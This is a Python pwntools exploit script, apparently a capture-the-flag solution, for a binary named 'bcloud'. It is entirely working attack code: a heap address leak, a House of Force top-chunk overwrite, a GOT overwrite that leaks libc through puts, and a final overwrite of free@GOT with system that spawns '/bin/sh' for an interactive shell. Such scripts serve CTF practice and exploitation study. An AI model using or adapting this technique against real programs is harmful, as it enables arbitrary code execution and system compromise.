#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./bcloud"

note_array = 0x804b120
note_len_array = 0x804b0a0
puts_plt = 0x8048520
atoi_got = 0x804b03c
free_got = 0x804b014
atoi_off = 0x2d250
system_off = 0x3ada0

p = process(elf)

def new(size, content):
    p.recvuntil("option--->>\n")
    p.sendline("1")
    p.recvline("Input the length of the note content:")
    p.sendline(str(size))
    p.recvline("Input the content:")
    p.sendline(content)

def edit(idx, content):
    p.recvuntil("option--->>\n")
    p.sendline("3")
    p.recvline("Input the id:")
    p.sendline(str(idx))
    p.recvline("Input the new content:")
    p.send(content)

def delete(idx):
    p.recvuntil("option--->>\n")
    p.sendline("4")
    p.recvuntil("Input the id:\n")
    p.sendline(str(idx))

# leak heap

p.recvline("Input your name:")
p.send("A"*0x40)
p.recvuntil("Hey "+"A"*0x40)

heap_base = u32(p.recv(0x4))-0x8
log.info("heap_base: "+hex(heap_base))

# overwrite topchunk

p.recvuntil("Org:\n")
p.send("A"*0x40)
p.recvuntil("Host:\n")
p.sendline(p32(0xffffffff))

# leak libc

off_size = note_len_array - (heap_base + 0xd8 + 0xc) - (2 * 0x4)
new(off_size, "")

payload = p32(0x4)*2
payload += p8(0)*(0x80-len(payload))
payload += p32(free_got)
payload += p32(atoi_got)
new(int("0xb0", 0x10), payload)

edit(0, p32(puts_plt))

delete(1)

p.recvuntil("Input the id:\n")
libc_base = u32(p.recv(4))-atoi_off
log.info("libc_base: "+hex(libc_base))

# write system

system_addr = libc_base+system_off
edit(0, p32(system_addr))

new(8, "/bin/sh")
delete(1)

p.interactive()
